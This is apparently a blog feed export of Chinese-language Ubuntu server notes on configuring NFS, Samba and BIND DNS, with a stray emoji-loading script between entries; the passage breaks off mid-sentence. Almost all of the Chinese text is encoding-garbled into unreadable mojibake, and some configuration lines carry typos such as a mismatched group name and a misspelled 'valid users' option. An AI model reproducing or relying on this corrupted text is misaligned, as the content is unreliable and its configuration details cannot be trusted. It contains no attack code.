è¿œç¨‹ç™»å½•é‚£ä¸€ç« å·²ç»å­¦äº† NFSæœåŠ¡ é€‚ç”¨äºç±»UNIXç³»ç»Ÿ NFS â€“ Network File System æœ€æ—©ç”±SUNå…¬å¸å¼€å‘ ç±»unixå¹³å°æœ€ä¸»è¦çš„æ–‡ä»¶å…±äº«æ–¹æ³• åŸºäºRPC(Remote Procedure Call)åè®® NFSæ˜¯ä¸€ä¸ªRPC Server ï¼ˆv3 ã€v4ï¼‰ åè®®æœ¬èº«ä¸åŠ å¯†ï¼Œå¯ç»“åˆSSHï¼ŒKerberoså®ç°åŠ å¯† éšè—å¼èº«ä»½éªŒè¯ï¼ˆéš¾ç‚¹ï¼‰ æƒé™é…ç½®æ˜¯å…³é”® æœåŠ¡ç«¯å£: TCP 2049 å®‰è£… sudo apt-get install nfs-kernel-server # æœåŠ¡ç«¯ sudo apt-get install nfs-common # å®¢æˆ·ç«¯ # å®‰è£…å®Œï¼ŒæœåŠ¡å·²ç»éƒ½å¯åŠ¨äº† ps -ef |grep rpc ps -ef |grep nfs è¿›ç¨‹ rpcbind # RPCæœåŠ¡è¿›ç¨‹ nfsd # NFSä¸»è¿›ç¨‹(èº«ä»½è¯†åˆ«) mountd # æ ¹æ® /etc/exports é…ç½®éªŒè¯æƒé™ lockd # é”å®šï¼ˆéœ€C/SåŒæ—¶å¯ç”¨ï¼‰ statd # ä¸€è‡´æ€§ï¼ˆéœ€C/SåŒæ—¶å¯ç”¨ï¼‰ èº«ä»½è¯†åˆ« å®¢æˆ·ç«¯æä¾› UID / GID (ä¸ç”¨æˆ·åã€ç»„åæ— å…³) æœåŠ¡å™¨æŒ‰å®¢æˆ·ç«¯UID /GID èµ‹æƒ è‹¥æœåŠ¡å™¨æ— å®¢æˆ·ç«¯UID / GIDè´¦å·ï¼Œåˆ™å°†å®¢æˆ·ç«¯æ˜ å°„ä¸ºåŒ¿åè´¦å· nobody / nogroup (uid: 65534) å®¢æˆ·ç«¯ä½¿ç”¨rootè´¦å·ï¼ˆUID 0ï¼‰ï¼Œé»˜è®¤æ˜ å°„ä¸ºåŒ¿åè´¦å· å¯ä¿®æ”¹é…ç½®æ–‡ä»¶æ˜ å°„ UID 0 ä¸ºæœåŠ¡ç«¯ ROOT ï¼ˆå­˜åœ¨å®‰å…¨éšæ‚£ï¼‰ å¦‚æœå®¢æˆ·ç«¯uidå’ŒæœåŠ¡ç«¯uidç›¸åŒï¼Œåˆ™å®¢æˆ·ç«¯ä¼šè·å¾—æœåŠ¡å™¨ç«¯è´¦å·çš„æƒé™ï¼›è‹¥ä¸åŒï¼Œåˆ™å®¢æˆ·ç«¯è·å–æœåŠ¡ç«¯çš„nobodyæƒé™(é™¤éå®¢æˆ·ç«¯æ˜¯rootè´¦å·,ä¸”æœåŠ¡ç«¯å¯ç”¨äº†å®¢æˆ·ç«¯çš„rootæ˜ å°„ä¸ºæœåŠ¡ç«¯çš„root) éšå¼çš„èº«ä»½è®¤è¯ æƒé™ä½“ç³» 1.å…±äº«æƒé™ 2.æ–‡ä»¶ç³»ç»Ÿæƒé™ é…ç½® sudo vim /etc/exports # ä¸»é…ç½®æ–‡ä»¶ # å†…å®¹ï¼šå…±äº«ç›®å½•,è°å¯ä»¥è®¿é—®æˆ‘, æƒé™ï¼Œ(syncæ˜¯æ•°æ®å…ˆå†™åˆ°å†…å­˜åœ¨ç¡¬ç›˜å¯é ,asyncæ˜¯å†™åˆ°å†…å­˜ç„¶åå†™çš„ç¡¬ç›˜é€Ÿåº¦å¿«)ï¼Œno_subtree_checkæ˜¯ä¸è¿›è¡Œå­ç›®å½•çš„æ£€æŸ¥(å»ºè®®ä½¿ç”¨) /exports/public 192.168.1.0/24(rw,sync,no_subtree_check) # å…è®¸è®¿é—®çš„èŒƒå›´å¯ä»¥ä½¿ç”¨é€šé…ç¬¦ï¼š *.lab.com no_root_squash # ç¦ç”¨rooté»˜è®¤æ˜ å°„ä¸ºnobody(åŠ åœ¨ä¸Šé¢æ‹¬å·ä¸­çš„é…ç½®ä¸­) # sudo mkdir -p /exports/public # åˆ›å»ºå…±äº«ç›®å½• sudo chown nobody:nogroup /exports/public # è®¾ç½®æƒé™ sudo systemctl restart nfs-kernel-server # é‡å¯æœåŠ¡ sudo exportfs # æŸ¥çœ‹å…±äº«ç›®å½• cat /var/lib/nfs/etab # å…±äº«ç›®å½• cat /var/lib/nfs/xtab # å®¢æˆ·ç«¯ä¿¡æ¯ å…±äº«æƒé™ ro/rw # åªè¯»/åªå†™ sync / async # åŒæ­¥å†™å…¥ç¡¬ç›˜ / æš‚å­˜äºå†…å­˜ä¸­ all_squash # æ‰€æœ‰ç”¨æˆ·å…¨éƒ¨æ˜ å°„ä¸ºnobody anonuid / anongid # æ”¯ä»˜é‚£ä¸ªåŒ¿åIDï¼ˆé»˜è®¤65534ï¼‰ secure / insecure # ä½¿ç”¨1024ä»¥ä¸‹/ä»¥ä¸Šç«¯å£ hide / no_hide # å…±äº« / ä¸å…±äº«NFSå­ç›®å½• å®¢æˆ·ç«¯æŒ‚è½½ # å’Œæœ¬åœ°æŒ‚è½½è®¾å¤‡ä¸€æ ·(æŒ‚è½½åˆ°æœ¬åœ°ï¼Œä½†æ˜¯è®¿é—®æ˜¯é€šè¿‡ç½‘ç»œæµé‡çš„) sudo mount 192.168.0.30:/export/public my_nfs/ # å†™å…¥æ–‡ä»¶çš„è¯ 1.ä¸´æ—¶è·å–rootæƒé™ï¼Œä¼šé»˜è®¤è½¬ä¸ºnobody sudo xxxxx 2. chmodä¿®æ”¹å…¶ä»–ç”¨æˆ·çš„æƒé™åï¼Œç›´æ¥å†™å…¥å³å¯(å®¢æˆ·ç«¯çš„uidä¸æœåŠ¡ç«¯çš„uidç›¸åŒçš„è¯) å¯åŠ¨æŒ‚è½½é£é™©ï¼šnfsæœåŠ¡å™¨å¦‚æœå‡ºç°é—®é¢˜ï¼Œæœ¬åœ°æœºå™¨å¯åŠ¨å°±ä¼šç‰¹åˆ«æ…¢ # sudo vim /etc/fstab 192.168.1.30:/home /my_nfs/ nfs no_auto,nofail,noatime,nolock,intr,tcp,actimeo=1800 0 0 # å»ºè®® no_auto ä¸è‡ªåŠ¨æŒ‚è½½ å…¶ä»–å‘½ä»¤ rpcinfo -p 192.168.1.30 # æŸ¥è¯¢RPCæœåŠ¡æ³¨å†ŒçŠ¶æ€(å®¢æˆ·ç«¯ä¸æœåŠ¡ç«¯éƒ½å¯ä»¥æ‰§è¡Œ) tail /var/log/kern.log # æœåŠ¡å™¨æ—¥å¿— showmount -e localhost # æ˜¾ç¤ºå…±äº«ç›®å½• df -h # å®¢æˆ·ç«¯æŸ¥çœ‹æŒ‚è½½ ä¼ä¸šç¯å¢ƒæœ‰ç»Ÿä¸€åŸŸåå’Œèº«ä»½éªŒè¯æ—¶ # ä¹Ÿè¦é…ç½®è¿™ä¸ª sudo vim /etc/idpamd.conf Domain = lab.com Windowså®¢æˆ·ç«¯ä¼ä¸šç‰ˆæ‰å¯ä»¥æ·»åŠ nfsçš„æ”¯æŒ SAMBAæœåŠ¡SMB / CIFS åè®® å…¨ç§°Server message block / Common internet file system æœ€æ—©ç”±IBMç ”å‘ï¼Œåç”±å¾®è½¯é‡‡ç”¨å¹¶ä¸æ–­å®Œå–„ Windowsæ–‡ä»¶å’Œæ‰“å°å…±äº«ï¼ˆä¹‹å‰ä½¿ç”¨çš„SMBåè®®, åæ¥æ”¹è¿›ä¸ºcifsåè®®ï¼‰ ç«¯å£ï¼šTCP 139(å±€åŸŸç½‘), 445() / UDP 137(ç”¨æ¥åç§°è§£æ), 138 Samba æ˜¯å¼€æºä¸–ç•Œé€†å‘äº†SMBåè®®åæ‰“é€ çš„å…¼å®¹å¾®è½¯SMBçš„æ–‡ä»¶å…±äº«æœåŠ¡ Sambaè¿˜æœ‰å…¶ä»–åŠŸèƒ½ã€ç”¨é€”å’Œä½¿ç”¨åœºæ™¯ åŠŸèƒ½ä¸ä»…é™äºæ­¤ï¼Œä½†æœ€å¸¸ç”¨çš„ç”¨é€”ï¼Œè¿˜æ˜¯åšæ–‡ä»¶å…±äº«æœåŠ¡ï¼š NFSåªé€‚ç”¨äºç±»Unixç³»ç»Ÿç¯å¢ƒ Sambaé€‚ç”¨ä¸Windowsã€Linuxæ··åˆç¯å¢ƒçš„æ–‡ä»¶å…±äº«éœ€è¦ Sambaå®ç°äº†CIFSæœåŠ¡çš„å››ä¸ªåŸºæœ¬åŠŸèƒ½1.æ–‡ä»¶å’Œæ‰“å°å…±äº«2.è®¤è¯å’Œæˆæƒ3.åç§°è§£æ4.æœåŠ¡å®£å‘Š(browsing) ä¼ è¾“åè®®ï¼š NetBIOS # å±€åŸŸç½‘ NetBIOS over TCP/IP # è·¨ç½‘æ®µ(æŠŠNetBIOSæ•°æ®åŒ…å°è£…ä¹‹åè·¨ç½‘ç»œä¼ è¾“) åå°è¿›ç¨‹ Smbd # æ–‡ä»¶å…±äº«ä¸»è¿›ç¨‹ TCP: 139/445 Nmbd # WINSé€šä¿¡ã€åç§°è§£æ UDP: 137/138 Winbindd # åŒæ­¥ç³»ç»Ÿè´¦å·(æŠŠLinuxç³»ç»Ÿçš„è´¦æˆ·æ‹·åˆ°sambaçš„ç”¨æˆ·æ•°æ®åº“ä¸­è¿›è¡Œå¤„ç†) å…¶ä»–10å¤šä¸ªè¿›ç¨‹ å®‰è£…sudo apt install samba libpam-winbind é…ç½®é…ç½®æ–‡ä»¶ï¼š /etc/samba/dhcp.conf # æŒ‡å®šWINSæœåŠ¡å™¨ï¼ˆè·¨ç½‘æ®µæ—¶å€™ç”¨ï¼‰ /etc/samba/smb.conf # ä¸»é…ç½®æ–‡ä»¶ ä¸€. é…ç½®éªŒè¯ç”¨æˆ·åçš„SambaæœåŠ¡1.é…ç½®æ–‡ä»¶/etc/samba/smb.conf workgroup = WORKGROUP # [global] å·¥ä½œç»„ï¼šnet config worktationæŸ¥çœ‹å·¥ä½œç»„ [Private] # èµ·ä¸ªå(å…±äº«æ–‡ä»¶å¤¹çš„åç§°) comment = prvivate share # æè¿° path = /srv/private/ # å…±äº«è·¯å¾„ browseable = no # æ˜¯å¦å…è®¸è®¿é—®è€…å¯æ˜¾ç¤ºå®ƒè¿™ä¸ªå…±äº«æ–‡ä»¶å¤¹(å®Œæ•´è´¦å·) guest ok = no # ç¦ç”¨æ¥å®¾è´¦å· writable=yes # å¯è¯»å†™(read only=yes) create mask = 0700 # æ–°å»ºæ–‡ä»¶æƒé™ vaild users=@samba # å¯è®¿é—®å…±äº«çš„ç”¨æˆ·ç»„(ç¨åä¼šåˆ›å»º) # 2.åˆ›å»ºç”¨æˆ·/ç»„/å…±äº«æ–‡ä»¶å¤¹ sudo adduser user1 sudo groupadd smaba # ä¸Šé¢é…ç½®çš„ç»„çš„åç§° sudo gpasswd -a user1 samba sudo smbpasswd -a user1 # è®¾ç½®ç”¨æˆ·SMBå¯†ç (ä¸æ˜¯æ“ä½œç³»ç»Ÿçš„å¯†ç ) sudo mkdir /srv/private/ # åˆ›å»ºå…±äº«ç›®å½• sudo setfacl -R -m "g:samba:rwx" /srv/private/ # è®¾ç½®aclè®¿é—®æ§åˆ¶åˆ—è¡¨ï¼Œ-mä¿®æ”¹ (llä¹‹åçœ‹åˆ°åé¢æœ‰ä¸ª+å·ï¼Œè¡¨ç¤ºæœ‰æ›´å¤šæƒé™) getfacl /srv/private/ # æŸ¥çœ‹æƒé™ testparm # æ£€æµ‹ sudo systemctl restart smbd.service nmbd.service å®¢æˆ·ç«¯è®¿é—®winä¸Šå¯ä»¥è®¿é—®Linuxä¸Šçš„Sambaæ–‡ä»¶å¤¹, Linuxä¸Šä¹Ÿå¯ä»¥è®¿é—®Linuxä¸Šçš„Sambaæ–‡ä»¶å¤¹ Linux # å›¾å½¢åŒ– ç‚¹å‡»Connect to Serverï¼Œè¾“å…¥åœ°å€ï¼š smb://192.168.0.130 # å‘½ä»¤è¡Œ smbclient -L //192.168.0.130 # æŸ¥çœ‹ç›®æ ‡éƒ½æœ‰å“ªäº›å…±äº«ä¿¡æ¯ smbclient -L //192.168.0.130 -U user1 mount -t cifs -o username=user1 //192.168.0.130/private/public /mnt # æŒ‚è½½ Windows # win+R \\192.168.0.130 # å‘½ä»¤è¡Œå·¥å…·æ¥è®¿é—® net user # æŸ¥çœ‹ä¼šè¯ net user \\host\private/user1 passwd net user \\host\private /delete # åˆ é™¤å·²ç»å»ºç«‹çš„ä¼šè¯ net user g: \\host\private # æ˜ å°„ä¸ºæœ¬åœ°ç›˜ç¬¦ net config workstation å…±äº«åç§°ä»¥$ç»“å°¾çš„ï¼Œåœ¨winä¸Šä¼šè®¤ä¸ºéšè—å…±äº«(Linuxä¸Šè¿˜æ˜¯ä¼šæ˜¾ç¤º) äºŒ. é…ç½®å…¬å¼€è®¿é—®çš„SambaæœåŠ¡(å¼€æ”¾å…±äº«æ–‡ä»¶ä»¶)å°†ä¸æä¾›ç™»å½•è´¦å·çš„ç”¨æˆ·æ˜ å°„ä¸ºguestï¼Œæ— éœ€è¾“å…¥å¯†ç  1.é…ç½®æ–‡ä»¶ #é…ç½®æ–‡ä»¶/etc/samba/smb.conf [Global] # èµ·ä¸ªå(å…±äº«æ–‡ä»¶å¤¹çš„åç§°) workgroup = WORKGROUP security = user # shareå·²åºŸæ­¢ã€Domainã€ADSã€Server map to guest = bad user # æ˜ å°„ä¸ºguest guest ok = yes # å…è®¸æ¥å®¾è´¦å· 2.å¼€æ”¾å…±äº«æ–‡ä»¶å¤¹ [Public] comment = public share path = /srv/public/ browseable = yes # å…è®¸çœ‹åˆ° writable = yes guest ok = yes 3.åˆ›å»ºå…±äº«ç›®å½• mkdir -p /srv/public/ # è®¾ç½®è®¿é—®åˆ—è¡¨ï¼ˆè®¾ç½®user,nobodyä»£è¡¨guestï¼‰ sudo setfacl -R -m "u:nobody:rwx" /srv/public/ getfacl /srv/public/ # æŸ¥çœ‹æƒé™ testparm # æ£€æµ‹ # é‡å¯æœåŠ¡ sudo systemctl restart smbd.service nmbd.service å®¢æˆ·ç«¯è®¿é—®åŒä¸Š æœåŠ¡å™¨ä¿¡æ¯ smbd --version # æŸ¥çœ‹ç‰ˆæœ¬ sudo smbstatus # æŸ¥çœ‹çŠ¶æ€å’Œè¿æ¥çŠ¶å†µ document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>ubuntu</tag>
        <tag>æ–‡ä»¶æœåŠ¡</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ubuntu server-DNSæœåŠ¡]]></title>
    <url>%2Fposts%2F16425%2F</url>
    <content type="text"><![CDATA[DNSæœåŠ¡ æ‚¨æ˜¯è°å®¶è€å° åŸŸåè§£æåŸç†DNSï¼šå°†å®¹æ˜“åŸºäºçš„ä¸»æœºåæ˜ å°„åˆ°IPåœ°å€è®¡ç®—æœºå‘½åè§„èŒƒï¼š Netbisoåç§°ï¼ˆå¾®è½¯ï¼‰ Hostname DNSåˆ†å¸ƒå¼åç§°ç³»ç»Ÿ(ä½†æ˜¯ä¸åŒçš„dnsæœåŠ¡å™¨æ˜¯æœ‰å±‚çº§å…³ç³»çš„ï¼Œå‘ˆæ ‘çŠ¶ç»“æ„) DNSæœåŠ¡ç»“æ„ï¼š åŸŸå æ¯”å¦‚ï¼šsina.com.cn FQDN(fully qualified domain names ) æ¯”å¦‚:www.sina.com.cn å³ä¸»æœºå(www)+åŸŸå(sina.com.cn) DNSè®°å½•ç±»å‹ è®°å½•ç±»å‹ ä½œç”¨ NS åŸŸåæœåŠ¡å™¨è®°å½•(æ‰¾a.comä¸é‡Œé¢çš„åŸŸåå¯¹åº”çš„ipçš„è¯ï¼Œå°±è¦å»é—®åŸŸåæœåŠ¡å™¨,é—®ä»–wwwçš„å¯¹åº”çš„ä¸»æœºçš„ipåœ°å€æ˜¯å¤šå°‘)ï¼Œä¸€ä¸ªåŸŸå¯ä»¥æœ‰å¤šä¸ªåŸŸåæœåŠ¡å™¨(dig a.com ns) A ä¸»æœºè®°å½•(åŸŸåè§£æåˆ°ipåœ°å€) CNAME åˆ«åè®°å½•(ç»™åŸŸåæŒ‡å‘å¦ä¸€ä¸ªAè®°å½•çš„åŸŸå,å¯ä»¥å åŠ ) MX é‚®ä»¶äº¤æ¢è®°å½• PTR æŒ‡é’ˆè®°å½•ï¼ˆåå‘æŸ¥è¯¢ï¼‰ SOA èµ·å§‹æˆæƒè®°å½•(soaè®°å½•å¯¹åº”çš„åŸŸåæœåŠ¡å™¨ï¼Œæ‰æ˜¯åˆæ³•çš„) DNSå‘½åç©ºé—´ www.ubuntu.com.ä¸¥æ ¼æ¥è¯´æ˜¯æœ‰ç‚¹çš„ï¼Œä½†æ˜¯ä¸ºäº†æ–¹ä¾¿ï¼Œæœ€åé¢ä¸å†™ç‚¹ä¹Ÿå¯ä»¥ DNSæŸ¥è¯¢ï¼š é€çº§å§”æ´¾ç”±æœºæ„LCANNè´Ÿè´£ç®¡ç†, è´Ÿè´£æ ¹åŸŸ. DNSæŸ¥è¯¢å¯»ç»“æ„ä¸‰ç§DNSæœåŠ¡å™¨ï¼š Master(DNSåŸŸé‡Œé¢ä¸­ï¼ŒmasteræœåŠ¡å™¨å¯ä»¥ä¿®æ”¹DNSè®°å½•ï¼Œåœ¨masterä¸Šåšå¾—ä¿®æ”¹ä¹Ÿä¼šè‡ªåŠ¨åŒæ­¥åˆ°å…¶ä»–slaveç­‰dnsæœåŠ¡å™¨) ä¸€èˆ¬åªè®¾ç½®ä¸€å° Slaveï¼ˆæ•°æ®æ–‡ä»¶æ¥è‡ªmasterçš„åŒæ­¥ï¼‰ â€“ å‰ä¸¤è€…ä¸¤ç§æœåŠ¡å™¨éƒ½ä¼šä¿å­˜dnsè®°å½•ç±»å‹ Cache ï¼ˆä¸ä¿å­˜ä»»ä½•è®°å½•ï¼Œä¸€èˆ¬éƒ½æ˜¯è¿è¥å•†æä¾›çš„ï¼Œè·Ÿä¸‹é¢çš„dnsæŸ¥è¯¢æœ‰å…³ç³»ï¼Œæ„ä¹‰ï¼šæœ¬ä¸ªåŒºåŸŸå†…æœ‰ç¼“å­˜äº†å‡å°‘dnsä¼šè¯çš„æµé‡ï¼Œæé«˜äº†æ•ˆç‡ï¼Œå‡è½»äº†å¸¦å®½å ç”¨ï¼Œè¶…å‡ºç”Ÿå‘½å‘¨æœŸä¹‹åæ‰ä¼šå†æ¬¡æŸ¥è¯¢ï¼‰ TTL4.Forwardï¼ˆè½¬å‘ç±»å‹çš„ï¼Œæ¯”å¦‚ä¼šå»è½¬å‘ç»™æœ¬åœ°è¿è¥å•†çš„dnsæœåŠ¡å™¨(æ¯”å¦‚å®¶ç”¨æ— çº¿è·¯ç”±å™¨ä¼šä¼ä¸šçš„åŸŸæ§)ï¼Œè€Œä¸æ˜¯è‡ªå·±å»è¿›è¡Œé€’å½’æŸ¥è¯¢å•¥çš„ï¼‰ åŒæ—¶æ˜¯ä¸‰ç§è§’è‰² å®‰è£…DNSæœåŠ¡ä½¿ç”¨æœ€å¹¿çš„DNSæœåŠ¡çš„è½¯ä»¶åŒ…ï¼šBINDï¼ˆBerkley Internet Naming Daemonï¼‰åœ¨ubuntuä¸Šï¼š # å®‰è£…bind(å³è½¯ä»¶åŒ…) 9æ˜¯ç‰ˆæœ¬ï¼Œdnsutilsæ˜¯ç”¨æ¥æ£€æŸ¥çš„è½¯ä»¶åŒ… sudo apt install bind9 dnsutils # DNSæœåŠ¡åŒºåªä¿å­˜å’Œè§£ææœ¬åŸŸå„ç§åŸŸåè®°å½• # DNSæœåŠ¡éƒ½åŒ…å«13ä¸ªæ ¹åŸŸåæœåŠ¡å™¨åœ°å€ cat /etc/bind/db.root # -> ipv4å’Œipv6åœ°å€(AAAAè®°å½•) # äº‹å®åˆ†å¸ƒäºä¸–ç•Œçš„æ•°ç™¾å°æ ¹åŸŸæœåŠ¡å™¨ï¼Œä¸åªæ˜¯13ä¸ªï¼ˆå›½å†…æ˜¯æœ‰æ ¹åŸŸæœåŠ¡å™¨çš„ï¼‰ DNSæœåŠ¡å™¨çš„DNSæœåŠ¡å™¨é…ç½®è‡ªå·±åšè¿­ä»£æŒ‡å®šé€’å½’åŸŸåæœåŠ¡å™¨ï¼ˆè‡ªå»ºå°½é‡ç¦ç”¨å…¶ä»–åœ°å€æ¥è¿æ¥æˆ‘ä»¬é€’å½’æŸ¥è¯¢åŠŸèƒ½, é™¤éæŸ¥è¯¢çš„æ˜¯åŸŸå†…çš„åŸŸåï¼‰ # è§ DNSä¸»å¤‡éƒ¨ç½² DNSé»˜è®¤æœåŠ¡ç«¯å£TCP 53 / UDP 53 è¿™é‡Œæ˜¯ä»¥Bindè½¯ä»¶åŒ…ä¸ºä¾‹ è¿˜æœ‰å…¶ä»–è½¯ä»¶åŒ…ï¼š Djbdns è¡ç”Ÿç‰ˆæœ¬ï¼šDbndns, ndjbsns dhamasq DNS + DHCPæ‰“åŒ…çš„è½»é‡è§£å†³æ–¹æ¡ˆ â€“&gt; ç»å¸¸ç”¨äºæ— çº¿æ¸—é€ï¼Œæ­å»ºæ— çº¿AP3.PowerDNS æ¨¡å—åŒ–å¼€æºDNSæœåŠ¡å™¨è½¯ä»¶ DNSä¸»å¤‡éƒ¨ç½²å¯¹äºdnsæœåŠ¡å™¨æœ¬èº«çš„dnsåœ°å€å¯ä»¥æ‰§è¡Œè¿è¥å•†ç­‰çš„åœ°å€ æ­£å‘åŒºåŸŸé…ç½®Master DNSæœåŠ¡å™¨æ‰§è¡ŒåŒºåŸŸæ–‡ä»¶ï¼ˆæ­£å‘åŒºåŸŸ â€“&gt; åŸŸåè§£æä¸ºipï¼‰ ä¼ä¸šå†…éƒ¨è‡ªç”¨ï¼Œ ä¸€èˆ¬ä¸€ä¸ªåŸŸä¸­ä¼šæœ‰ä¸¤ä¸ªDNSæœåŠ¡å™¨ 1. # sudo vim /etc/bind/named.conf.local # zoneå®šä¹‰ä¸€ä¸ªåŒºåŸŸï¼Œ typeç±»å‹ï¼ŒæŒ‡å®šå­˜å…·ä½“è®°å½•çš„æ–‡ä»¶ zone "lab.com"{ type master; file "/etc/bind/db.lab.com" } 2.ç¼–è¾‘åŒºåŸŸæ–‡ä»¶ # æ‹·è´ä¸€ä¸ªç°æœ‰çš„åŒºåŸŸæ–‡ä»¶æ¨¡æ¿ï¼Œè¿›è¡Œä¿®æ”¹(ä¹Ÿå¯æ‰‹åŠ¨åˆ›å»º) cp db.local db.lab.com sudo vim db.lab.com # æ–‡ä»¶å†…å®¹ ; BIND data file for lab.com loopback interface ; $TTL 604800 # å…è®¸ç¼“å­˜DNSæœåŠ¡å™¨çš„ç¼“å­˜æ—¶é•¿ï¼Œå•ä½sï¼Œ 1D ->ä¸€å¤©,12h -> 12å°æ—¶ @ IN SOA soa.lab.com. root.localhost. ( # @è¡¨ç¤ºæœ¬åŸŸçš„åŸŸåï¼Œ IN ->äº’è”ç½‘è®°å½•ç±»å‹ï¼Œ SOAèµ·å§‹æˆæƒè®°å½•; root.localhost.ç®¡ç†å‘˜é‚®ç®±åœ°å€(ç‚¹å°±æ˜¯@ ->root.lab.com.), æ‹¬å·å¤šè¡Œå†…å®¹ 2 ; Serial # ç‰ˆæœ¬å·ï¼Œå¦‚æœslaveçš„ä¸masteræœåŠ¡å™¨å­—æ®µå€¼ç›¸åŒåˆ™ä¸åŒæ­¥æ•°æ®ï¼Œä¸åŒåˆ™åŒæ­¥æ•°æ® 604800 ; Refresh # slaveå‘masterçš„æ›´æ–°å‘¨æœŸ 86400 ; Retry # é‡è¯•å‘¨æœŸ 2419200 ; Expire # æœ€å¤§é‡è¯•æ—¶é—´ 604800 ) ; Negative Cache TTL ; @ IN NS ns1 # NSè®°å½•ï¼ŒdnsåŸŸçš„åŸŸåæœåŠ¡å™¨çš„åç§° @ IN A 10.1.8.128 # ç»™å“ªä¸ªåŸŸååˆ›å»ºAè®°å½•ï¼Œè®¿é—®æœ¬æœºçš„åŸŸåè§£æåˆ°å“ªé‡Œ @ IN AAAA ::1 # ipv6ä½¿ç”¨çš„ ns1 IN A 10.1.8.10 # ç»™åŸŸçš„nsè®°å½•åŸŸåè§£æåˆ°å“ªä¸ªip soa IN A 10.1.8.10 www IN CNAME web # æŠŠwww.lab.comè§£æä¸ºweb.com.lab web IN CNAME w3 # æœ‰ä¸€ä¸ªCNAMEè®°å½• w3 IN A 10.1.8.128 # æœ€ç»ˆè§£æä¸ºAè®°å½•çš„ip @ IN MX 10 mx1 # ä¼˜å…ˆçº§ï¼Œæ•°å­—è¶Šå°ä¼˜å…ˆçº§è¶Šé«˜ @ IN MX 10 mx2 mx1 IN A 10.1.8.1 # å†æŠŠmxçš„åŸŸåè§£æåˆ°ip mx2 IN A 10.1.8.2 ftp IN A 10.1.8.128 ftp IN A 10.1.8.129 # åŒä¸€ä¸ªaè®°å½•å‘½åæŒ‡å‘ä¸åŒçš„ipï¼Œä¸åŒºåˆ†ä¼˜å…ˆçº§ï¼Œè€Œæ˜¯è½®è¯¢ 3.é‡å¯æœåŠ¡ sudo systemctl restart bind9 sudo systemctl status bind9 4.æœåŠ¡å™¨é…ç½®æ£€æŸ¥ sudo named-checkconf # æ£€æŸ¥è¯­æ³•é”™è¯¯ sudo named-checkzone lab.com /etc/bind/db.lab.com # æ­£å‘åŒºåŸŸæ£€æŸ¥ sudo named-checkzone lab.com /etc/bind/db.lab.com # åå‘åŒºåŸŸæ£€æŸ¥ 5.å®¢æˆ·ç«¯è§£æéªŒè¯ # digåœ¨winä¸Šæ²¡æœ‰ ping lab.com dig lab.com ns @10.1.8.10 # è§£ænsè®°å½•ï¼Œ@dnsæœåŠ¡å™¨ dig www.com @10.1.8.10 dig com a @10.1.8.100 # ä¸æŒ‡å®šçš„è¯ï¼Œé»˜è®¤å°±æ˜¯aè®°å½• dig lab.com mx @10.1.8.100 å®¢æˆ·ç«¯è§£æéªŒè¯ # nslookupåœ¨linuxå’Œwinéƒ½æœ‰ nslookup # è®¾ç½®å‚æ•° server 10.1.8.100 # dnsæœåŠ¡å™¨ set q=ns # æŸ¥è¯¢è®°å½•ç±»å‹ lab.com # æŸ¥è¯¢ç›®æ ‡ ## Windowsæœ¬æœºhiè¿›è¡Œdnsæœ¬åœ°ç¼“å­˜ï¼Œ è€ŒLinuxæœ¬åœ°æ˜¯ä¸åšç¼“å­˜çš„ ipconfig /displaydns # æ˜¾ç¤ºæœ¬åœ°ç¼“å­˜çš„dnsè®°å½• ipconfig /flushdns # æ¸…ç©ºæœ¬åœ°ç¼“å­˜çš„dnsè®°å½• é…ç½®Cache DNSæœåŠ¡å™¨ä¸»é…ç½®æ–‡ä»¶/etc/bind/named.conf # åªæ˜¯ä¸€ä¸ªå…¥å£æ–‡ä»¶ include "/etc/bind/named.conf.options"; # è§„èŒƒ: ã€åˆ†å·ç»“å°¾ã€‘ include "/etc/bind/named.conf.local"; # include "/etc/bind/named.conf.default-zones"; å…¨å±€è½¬å‘DNSæœåŠ¡å™¨å¯¹äºä¸å±äºæˆ‘ä»¬åŸŸçš„è§£æè½¬å‘ç»™å…¶ä»–dnsæœåŠ¡å™¨ ï¼ˆæˆ‘ä»¬å†…éƒ¨çš„ndsæœåŠ¡å™¨ä¸çŸ¥é“æ€ä¹ˆè§£æä¹‹åè¦å»æ‰¾è°ï¼‰é…ç½®è½¬å‘å™¨çš„æ–‡ä»¶: vim /etc/bind/named.conf.options1.å…¨å±€è½¬å‘ï¼š acl "local"{ # options å—ä¹‹å‰ 10.1.8.0/24ï¼› # æœ¬åœ°ç½‘æ®µ(ä¸ºå…¬å¸å†…éƒ¨çš„åœ°å€æä¾›æœåŠ¡) }ï¼› options { recursion yes; # recursionå³é€’å½’æŸ¥è¯¢(å…¬ç½‘ä¸Šçš„dnsæœåŠ¡å™¨ä¸€èˆ¬æ˜¯ç¦æ­¢é€’å½’æŸ¥è¯¢çš„) allow-recursion { local; }; # å…è®¸å¯¹æˆ‘å‘èµ·é€’å½’æŸ¥è¯¢çš„åœ°å€èŒƒå›´ listen-on { 10.0.2.53; }; # æŒ‡å®šä¾¦å¬çš„åœ°å€ forwarders { 9.9.9.9; # å…¨å±€æ€§çš„è½¬å‘å™¨ï¼Œè½¬å‘ç»™è° 8.8.8.8; }; }; sudo systemctl restart bind9.service 2.å±€éƒ¨è½¬å‘ zone "sina.com.cn" { # åˆ›å»ºä¸€ä¸ªåŸŸå type forward; forwarders { 202.99.96.68; #å±€éƒ¨è½¬å‘ï¼Œé’ˆå¯¹æŸä¸ªåŸŸåè½¬å‘ç»™æŸä¸€ä¸ªip 202.106.0.20; }; }; sudo systemctl restart bind9.service è§£æè¿‡ä¹‹åï¼Œå°±æœ‰äº†ç¼“å­˜ï¼Œåœ¨ä¸€å®šæ—¶é—´å†…å°±ä¸ä¼šè½¬å‘å†è¿›è¡Œè¯·æ±‚äº† åå‘åŒºåŸŸé…ç½®Master DNSæœåŠ¡å™¨ï¼ˆiåå‘åŒºåŸŸ: ipè§£æä¸ºåŸŸå â€“&gt; ååƒåœ¾é‚®ä»¶ï¼‰ååƒåœ¾é‚®ä»¶ï¼šæ”»å‡»è€…ä¼ªé€ 